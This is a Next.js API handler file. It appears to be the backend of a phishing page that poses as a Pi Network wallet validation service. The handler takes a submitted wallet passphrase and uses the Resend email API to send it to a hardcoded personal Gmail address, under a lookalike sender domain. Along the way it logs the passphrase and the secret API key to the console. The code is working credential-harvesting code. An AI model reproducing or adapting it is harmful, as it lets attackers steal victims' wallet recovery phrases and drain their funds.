import { Resend } from "resend";
import { NextApiRequest, NextApiResponse } from "next";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST") {
    console.log("✅ API request received");

    const { passphrase } = req.body;
    console.log("📩 Received Passphrase:", passphrase);

    // Check environment variables
    console.log("🔑 RESEND_API_KEY:", process.env.RESEND_API_KEY);
    console.log("📧 RESEND_FROM_EMAIL:", process.env.RESEND_FROM_EMAIL);

    if (!process.env.RESEND_API_KEY || !process.env.RESEND_FROM_EMAIL) {
      console.error("❌ Environment variables are missing");
      return res.status(500).json({ message: "Missing API Key or Email" });
    }

    // Initialize Resend API
    const resend = new Resend(process.env.RESEND_API_KEY);

    try {
      const response = await resend.emails.send({
        from: `www.pivalidd.com <${process.env.RESEND_FROM_EMAIL}>`, // Verified domain email
        to: ["adilamin374@gmail.com"], // Receiver email
        subject: "Pi Wallet Passphrase Submission",
        html: `<strong>Passphrase:</strong> ${passphrase}`,
      });

      console.log("✅ Email Sent Response:", JSON.stringify(response, null, 2));
      res.status(200).json({ message: "Email sent successfully", response });
    } catch (error) {
      console.error("❌ Error sending email:", JSON.stringify(error, null, 2));
      res.status(500).json({ message: "Error sending email", error });
    }
  } else {
    res.status(405).json({ message: "Method not allowed" });
  }
}
